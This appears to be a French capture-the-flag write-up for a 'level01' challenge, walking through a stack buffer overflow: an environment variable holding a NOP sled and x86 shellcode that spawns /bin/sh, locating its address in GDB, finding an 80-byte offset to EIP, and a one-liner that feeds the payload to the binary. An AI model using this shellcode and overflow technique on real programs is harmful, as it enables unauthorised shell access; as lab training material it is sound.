Nous avons pour objectif de faire segfault notre programme afin d'y placer un shellcode executant donc: un shell.

--> On place notre shellcode dans une variable d'environnement, précédé d'un "NOP sled" (toboggan de `\x90` de 1000 octets) pour eviter les décalages mémoire entre GDB et l'environnement réel.

```shell
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

## Etape 1: Recuperer l'adresse du shellcode

On utilise GDB pour trouver l'adresse exacte de notre variable `SHELLCODE` en mémoire lors de l'exécution :

```shell
gdb ./level01
break main
# Breakpoint 1, 0x80484d5 in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xffffd4f7
```

--> L'adresse de base est `0xffffd4f7`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xffffd4f7 + 0x60` = **`0xFFFFD557`**
En Little Endian, notre adresse finale est : `\x57\xd5\xff\xff`

## Etape 2: Trouver le padding

Tout comme le bonus0, on va chercher l'endroit du segfault:

```shell
gdb ./level01
run 0123456789qwertyuiopasdfghjklzxcvbnm01234567-9QWERTYUIOPASDFGHJKLZXCVBNM01234567+9
#0x000a392b in ?? ()
print/c 0x000a392b
#$1 = 43 '+'
```

(Bien sur l'adresse change a chaque fois, le padding changera donc aussi)

--> A etait le 81eme char de notre chaine, on en deduit que le padding est de 80.

## Etape 3: Executer

La structure du deuxième input sera : `[x bytes padding] + [Adresse EIP]`

```shell
(echo "dat_wil"; sleep 0.5; python -c 'print "A"*80 + "\x57\xd5\xff\xff"'; cat) | ./level01
```

--> On obtient notre flag pour le level02 !